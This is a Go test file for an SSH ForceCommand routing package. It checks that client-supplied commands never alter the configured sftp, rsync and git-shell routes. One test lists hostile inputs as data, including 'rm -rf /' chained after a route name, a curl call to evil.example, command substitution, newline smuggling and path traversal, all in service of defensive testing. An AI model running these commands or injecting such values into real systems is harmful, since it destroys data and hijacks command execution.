// SPDX-License-Identifier: Apache-2.0
// Filename: internal/logshell/route_test.go
package logshell

import (
	"slices"
	"strings"
	"testing"
)

func testRoutes() ForceCommandConfig {
	return ForceCommandConfig{Routes: map[string]Route{
		"internal-sftp": {Exec: []string{"/usr/lib/ssh/sftp-server", "-l", "INFO"}},
		"rsync":         {Exec: []string{"/usr/bin/rrsync", "-no-del", "/srv"}},
		"git-shell":     {Command: "/usr/bin/git-shell"},
	}}
}

// TestResolveRoutes is acceptance test T-1: every branch goes where it should,
// and no branch falls through to an unrecorded shell.
func TestResolveRoutes(t *testing.T) {
	f := testRoutes()
	tests := []struct {
		name     string
		original string
		wantKind RouteKind
		wantPath string
		wantArgs []string
	}{
		{
			// No command requested. The routes are not consulted at all; the
			// caller fills Path in with the account's own shell.
			name: "empty is interactive", original: "",
			wantKind: RouteInteractive, wantPath: "", wantArgs: nil,
		},
		{
			// The one command that genuinely needs translating: internal-sftp is
			// in-process inside sshd and has no binary to exec.
			name: "internal-sftp translates to the real binary", original: "internal-sftp -l INFO -f AUTH",
			wantKind: RouteExec, wantPath: "/usr/lib/ssh/sftp-server", wantArgs: []string{"-l", "INFO"},
		},
		{
			// The client's arguments are DISCARDED. The argv comes from the
			// root-owned config, never from the client.
			name: "route args come from config, not the client", original: "internal-sftp -l DEBUG3 -d /",
			wantKind: RouteExec, wantPath: "/usr/lib/ssh/sftp-server", wantArgs: []string{"-l", "INFO"},
		},
		{
			name: "a path-qualified program matches on its basename", original: "/usr/lib/ssh/internal-sftp -l INFO",
			wantKind: RouteExec, wantPath: "/usr/lib/ssh/sftp-server", wantArgs: []string{"-l", "INFO"},
		},
		{
			// rrsync reads $SSH_ORIGINAL_COMMAND itself, so a fixed argv suffices.
			name: "rsync routes to rrsync with a fixed argv", original: "rsync --server --sender -vlogDtpre.iLsfxCIvu . /srv/x",
			wantKind: RouteExec, wantPath: "/usr/bin/rrsync", wantArgs: []string{"-no-del", "/srv"},
		},
		{
			name: "a command route passes the original as one -c argument", original: "git-upload-pack 'repo.git'",
			wantKind: RouteDefault, wantPath: "", wantArgs: []string{"-c", "git-upload-pack 'repo.git'"},
		},
		{
			name: "git-shell matches the command route", original: "git-shell -c whatever",
			wantKind: RouteCommand, wantPath: "/usr/bin/git-shell", wantArgs: []string{"-c", "git-shell -c whatever"},
		},
		{
			// Pre-9.0 scp arrives as an ordinary command and needs no route.
			name: "old-style scp falls to the default route", original: "scp -t /tmp/x",
			wantKind: RouteDefault, wantPath: "", wantArgs: []string{"-c", "scp -t /tmp/x"},
		},
		{
			name: "an ordinary command falls to the default route", original: "id; hostname",
			wantKind: RouteDefault, wantPath: "", wantArgs: []string{"-c", "id; hostname"},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := f.Resolve(tt.original)
			if got.Kind != tt.wantKind {
				t.Errorf("Kind = %v, want %v", got.Kind, tt.wantKind)
			}
			if got.Path != tt.wantPath {
				t.Errorf("Path = %q, want %q", got.Path, tt.wantPath)
			}
			if !slices.Equal(got.Args, tt.wantArgs) {
				t.Errorf("Args = %q, want %q", got.Args, tt.wantArgs)
			}
			if got.Original != tt.original {
				t.Errorf("Original = %q, want %q", got.Original, tt.original)
			}
		})
	}
}

// TestResolveHostileCommands is acceptance test T-2, and the security core.
//
// SSH_ORIGINAL_COMMAND is entirely attacker-controlled. Two properties have to
// hold for every input:
//
//   - Nothing from the client is ever interpolated into a route's argv. A route
//     runs the argv written in the root-owned config and nothing else.
//   - An unmatched command reaches the DEFAULT route as ONE -c argument. That is
//     exactly what sshd would have done with no ForceCommand at all, so no branch
//     is more permissive than the baseline.
//
// Note what the metacharacter cases prove. "sftp-server; rm -rf /" does NOT
// match the sftp route, because field 0 is "sftp-server;" and matching is exact.
// It falls to the default route and the shell handles the whole string as it
// always would. A matcher that stripped punctuation before comparing would match
// the route and SILENTLY DISCARD the rest of the command -- a semantic change
// invisible to both the client and the transcript.
func TestResolveHostileCommands(t *testing.T) {
	f := testRoutes()
	hostile := []string{
		"sftp-server; rm -rf /",
		"internal-sftp && curl evil.example",
		"internal-sftp | tee /tmp/x",
		"$(internal-sftp)",
		"`internal-sftp`",
		"'internal-sftp'",
		`"internal-sftp"`,
		"internal-sftp\nrm -rf /",
		"FOO=1 rsync --server",
		"../../bin/sh",
		"rsync\x00--server",
		strings.Repeat("A", 64*1024),
		"   ",
		"\t\t",
	}
	for _, original := range hostile {
		t.Run(strings.ToValidUTF8(original[:min(len(original), 32)], ""), func(t *testing.T) {
			got := f.Resolve(original)

			if got.Kind == RouteInteractive {
				t.Fatalf("a non-empty command must never be treated as interactive: %q", original)
			}
			if got.Kind == RouteDefault {
				if !slices.Equal(got.Args, []string{"-c", original}) {
					t.Errorf("default route Args = %q, want exactly [-c <original>]", got.Args)
				}
				return
			}
			// A matched route: its argv must be byte-identical to the config's,
			// with nothing from the client anywhere in it.
			for _, arg := range got.Args {
				if strings.Contains(original, arg) && !slices.Contains([]string{"-l", "INFO", "-no-del", "/srv"}, arg) {
					t.Errorf("client text leaked into route argv: %q", arg)
				}
			}
		})
	}
}

// TestResolveRelativeAndTraversalPathsMatchOnBasename.
//
// Only the basename is compared and the route's argv comes from the config, so a
// traversal in field 0 selects a route at most -- it can never influence what
// that route runs.
func TestResolveRelativeAndTraversalPathsMatchOnBasename(t *testing.T) {
	f := testRoutes()
	for _, original := range []string{"./internal-sftp", "../../internal-sftp", "/tmp/evil/internal-sftp"} {
		got := f.Resolve(original)
		if got.Kind != RouteExec || got.Path != "/usr/lib/ssh/sftp-server" {
			t.Errorf("Resolve(%q) = %v %q, want the configured sftp route", original, got.Kind, got.Path)
		}
		if !slices.Equal(got.Args, []string{"-l", "INFO"}) {
			t.Errorf("Resolve(%q).Args = %q, want the configured argv", original, got.Args)
		}
	}
}

// TestResolveWithNoRoutesAlwaysReachesTheDefault.
//
// An empty table is a valid deployment -- correct for a host whose sshd_config
// names an external sftp-server binary -- and must still never fall through.
func TestResolveWithNoRoutesAlwaysReachesTheDefault(t *testing.T) {
	var f ForceCommandConfig
	if got := f.Resolve(""); got.Kind != RouteInteractive {
		t.Errorf("empty command with no routes: Kind = %v, want interactive", got.Kind)
	}
	if got := f.Resolve("internal-sftp"); got.Kind != RouteDefault {
		t.Errorf("unmatched command with no routes: Kind = %v, want default", got.Kind)
	}
}
